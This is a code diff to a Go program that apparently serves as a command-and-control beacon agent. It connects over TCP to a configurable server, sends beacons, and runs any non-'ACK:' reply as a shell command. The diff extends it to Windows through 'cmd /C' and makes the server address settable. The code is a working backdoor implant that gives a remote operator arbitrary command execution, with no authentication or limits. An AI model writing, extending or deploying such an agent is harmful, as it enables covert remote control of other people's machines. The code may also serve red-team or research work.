@@ -9,6 +9,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"runtime"
 	"strings"
 	"time"
 )
@@ -16,10 +17,14 @@ import (
 var (
 	serverAddr = flag.String("addr", "localhost:8080", "Server address")
 	AgentID    = "dev-agent-001"
+	ServerAddr = "localhost:8080"
 )
 
 func main() {
 	flag.Parse()
+	if *serverAddr != "localhost:8080" {
+		ServerAddr = *serverAddr
+	}
 	hostname, err := os.Hostname()
 	if err != nil {
 		log.Fatalf("failed to get hostname: %v", err)
@@ -30,7 +35,7 @@ func main() {
 	}
 	for {
 
-		conn, err := net.Dial("tcp", *serverAddr)
+		conn, err := net.Dial("tcp", ServerAddr)
 		if err != nil {
 			log.Fatalf("failed to connect to server: %v", err)
 		}
@@ -49,7 +54,12 @@ func main() {
 		if strings.HasPrefix(response, "ACK:") {
 			log.Printf("beacon acknowledged")
 		} else {
-			cmd := exec.Command("sh", "-c", strings.TrimSpace(response))
+			var cmd *exec.Cmd
+			if runtime.GOOS == "windows" {
+				cmd = exec.Command("cmd", "/C", strings.TrimSpace(response))
+			} else {
+				cmd = exec.Command("sh", "-c", strings.TrimSpace(response))
+			}
 			output, err := cmd.CombinedOutput()
 			if err != nil {
 				log.Printf("failed to execute command: %v", err)
